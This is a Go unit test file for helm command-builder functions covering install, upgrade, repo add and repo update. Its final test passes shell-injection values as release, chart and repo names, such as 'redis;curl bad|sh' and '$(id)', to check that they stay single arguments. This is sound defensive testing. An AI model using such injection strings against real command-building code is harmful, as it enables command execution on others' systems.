package helm

import (
	"strings"
	"testing"
)

func TestInstallCommandRedis(t *testing.T) {
	cmd := InstallCommand("redis", "bitnami/redis", "demo", "", 0)
	joined := strings.Join(cmd, " ")
	if !strings.Contains(joined, "helm install redis bitnami/redis") {
		t.Fatalf("cmd=%s", joined)
	}
	if !strings.Contains(joined, "-n demo") {
		t.Fatalf("cmd=%s", joined)
	}
}

func TestInstallCommandReplicas(t *testing.T) {
	cmd := InstallCommand("redis", "bitnami/redis", "default", "kind-test", 3)
	joined := strings.Join(cmd, " ")
	if !strings.Contains(joined, "replicaCount=3") || !strings.Contains(joined, "--kube-context kind-test") {
		t.Fatalf("cmd=%s", joined)
	}
}

func TestRepoAddCommand(t *testing.T) {
	cmd := RepoAddCommand("bitnami", "https://charts.bitnami.com/bitnami")
	if strings.Join(cmd, " ") != "helm repo add bitnami https://charts.bitnami.com/bitnami" {
		t.Fatalf("cmd=%v", cmd)
	}
}

func TestUpgradeCommand(t *testing.T) {
	cmd := UpgradeCommand("nginx", "bitnami/nginx", "default", "", "15.3.2")
	joined := strings.Join(cmd, " ")
	if !strings.Contains(joined, "helm upgrade nginx bitnami/nginx") {
		t.Fatalf("cmd=%s", joined)
	}
	if !strings.Contains(joined, "--version 15.3.2") {
		t.Fatalf("cmd=%s", joined)
	}
}

func TestRepoUpdateCommand(t *testing.T) {
	cmd := RepoUpdateCommand("bitnami")
	if strings.Join(cmd, " ") != "helm repo update bitnami" {
		t.Fatalf("cmd=%v", cmd)
	}
}

func TestCommandBuildersKeepMaliciousLookingArgsAsSingleArg(t *testing.T) {
	release := "redis;curl bad|sh"
	chart := "bitnami/redis;$(id)"
	repoName := "bitnami;echo pwn"
	repoURL := "https://charts.bitnami.com/bitnami?x=$(id)"

	install := InstallCommand(release, chart, "default", "", 0)
	if install[0] != "helm" || install[2] != release || install[3] != chart {
		t.Fatalf("install=%v", install)
	}
	if len(install) < 4 {
		t.Fatalf("install too short: %v", install)
	}

	repoAdd := RepoAddCommand(repoName, repoURL)
	if repoAdd[0] != "helm" || repoAdd[3] != repoName || repoAdd[4] != repoURL {
		t.Fatalf("repo add=%v", repoAdd)
	}
}
